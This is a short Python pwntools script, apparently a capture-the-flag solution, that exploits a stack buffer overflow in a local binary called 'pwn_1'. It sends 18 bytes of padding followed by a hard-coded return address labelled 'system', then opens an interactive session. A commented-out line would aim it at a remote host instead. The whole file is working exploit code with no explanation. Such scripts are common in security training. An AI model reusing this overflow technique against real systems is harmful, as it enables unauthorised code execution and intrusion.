from pwn import *

system = 0x4011aa

payload = b"".join([
    b"A"*18,
    p64(system),
])

#p = remote("IP", PORT)
p = process("./pwn_1")
#input("Waiting for debuger")
p.send(payload+b"\n")
p.recvuntil(b"adorable...\n")
p.interactive()
